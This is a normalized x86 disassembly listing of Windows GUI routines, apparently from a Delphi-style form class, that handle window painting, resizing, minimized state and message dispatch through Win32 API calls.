sub_45bde8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441a20
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_414210
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45d44c
mov edx esi
mov eax ebp
call sub_414500
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45d424
mov edx esi
mov eax edi
call sub_45d44c
jmp r-xdata
xor edx edx
mov eax edi
call sub_45d400
sub_45bef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44561c
xor edx edx
push ebp
push sub_45c14a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444d78
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441f6c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441fb0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_45c27c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_443750
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c151
mov eax [ ebp - 0x4 ]
call sub_445624
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45b45c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448848
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b45c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448848
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41d3b4
push eax
call sub_4062e4
mov edx eax
mov eax esi
call sub_41d3bc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4062e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45c159
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4460c4
push 0x0
push 0x0
push ebx
push sub_45c260
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45c22c
push ebx
push sub_45c244
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45c20b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4176cc
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44267c
sub_45c297
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45b45c
mov ecx edi
mov edx esi
mov eax ebx
call sub_448848
mov eax ebx
call sub_45c380
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41d458
push eax
call sub_4062e4
mov edx eax
mov eax ebp
call sub_41d474
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_441f98
mov ebp eax
push edi
push esi
mov eax ebx
call sub_441f54
push eax
call sub_4062e4
mov edx eax
mov eax ebx
call sub_45c628
push edi
push esi
push ebp
call sub_4062e4
mov edx eax
mov eax ebx
call sub_45c658
sub_45c324
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45e684
push eax
push 0x1
push 0x80
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ebx
retn
sub_45c3b8
push ebx
mov ebx eax
mov eax ebx
call sub_45d2d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45c44c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_448e4c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_45c4d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_449328
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a3d4
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a3a8
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403540
test al al
jne r-xdata
sub_45c540
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40328c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45c56c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebp
call sub_445ab4
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a3d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_449370
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a3a8
mov si 0xfff1
call sub_403540
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a3e4
jmp r-xdata
sub_45c600
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_442738
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443750
sub_45c628
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_441f6c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45c658
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_441fb0
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45c688
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_442470
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45d7c0
pop esi
pop ebx
retn
sub_45c6cc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_45c725
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c72c
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_45c734
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_442424
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4462dc
mov eax ebx
call sub_446478
sub_45c76c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a220
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_45c7ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446798
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403540
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403540
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_443750
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_455cd8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d0d8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ca25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45ca08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41e2b4
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e130
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4571c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca0f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e2b4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_455cd8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d0d8
call sub_448d84
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45cb53
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45cb2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45cb0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e2b4
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e130
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb16
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e2b4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_448d84
mov esi eax
sub_45cb33
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ReleaseDC
retn
sub_45cbe4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45cc30
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45d10c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45d158
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45cc70
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45ce3e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d9fc
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_442094
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_440e8c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_45cbe4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d9fc
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_45d10c
test eax eax
je r-xdata
push ebp
call sub_45cbe4
pop ecx
push ebp
call sub_45cbe4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45cc30
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_459e58
jmp r-xdata
sub_45ce50
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_45b020
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_45cebc
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45b6bc
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax ebx
call sub_41a3d4
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_445ba8
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a3a8
call sub_45681c
mov edx esi
mov eax ebx
call sub_41a3a8
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
sub_45cf54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_45cfd1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45cfdc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446324
sub_45d008
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_446324
xor edx edx
jmp r-xdata
mov eax esi
call sub_45b19c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45d040
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_441d54
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_446324
sub_45d084
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_441e60
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
